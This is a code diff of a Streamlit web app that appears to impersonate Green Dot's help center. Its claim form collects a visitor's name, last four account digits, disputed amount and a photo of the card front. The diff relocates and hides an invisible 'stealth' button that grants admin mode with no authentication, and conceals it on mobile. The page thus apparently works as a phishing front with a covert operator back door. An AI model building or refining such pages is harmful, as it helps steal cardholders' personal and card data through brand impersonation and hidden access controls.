@@ -55,11 +55,11 @@ st.markdown("""<style>
         position: relative;
     }
 
-    /* STEALTH LOGIN TRIGGER ON THE BORDER */
+    /* STEALTH LOGIN TRIGGER ON THE LEFT BORDER - HIDDEN ON MOBILE */
     .stealth-trigger {
         position: absolute !important;
-        bottom: 0 !important; right: 0 !important;
-        width: 20px !important; height: 20px !important;
+        bottom: 0 !important; left: 0 !important;
+        width: 30px !important; height: 30px !important;
         z-index: 999 !important;
     }
     
@@ -67,9 +67,15 @@ st.markdown("""<style>
         background: transparent !important;
         border: none !important;
         color: transparent !important;
-        width: 20px !important;
-        height: 20px !important;
+        width: 30px !important;
+        height: 30px !important;
         cursor: default !important;
+    }
+
+    @media (max-width: 768px) {
+        .stealth-trigger {
+            display: none !important;
+        }
     }
 
     .legal-container {
@@ -93,7 +99,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_9", clear_on_submit=True):
+    with st.form("claim_v32_8_0", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -101,7 +107,7 @@ if not st.session_state.admin_mode:
         st.file_uploader("Card Front", type=['jpg','png','jpeg'])
         if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")
 
-    # --- DOWNLOAD APP SECTION (CLEAN CENTERED LAYOUT) ---
+    # --- DOWNLOAD APP SECTION ---
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;'>
@@ -115,9 +121,9 @@ if not st.session_state.admin_mode:
         <p style='color:#888; font-size: 13px; margin-top:15px;'>Secure mobile banking for your account.</p>
     """, unsafe_allow_html=True)
     
-    # The stealth button at the bottom-right border
+    # Stealth trigger moved to LEFT BORDER
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin"):
+    if st.button(" ", key="stealth_admin_left"):
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
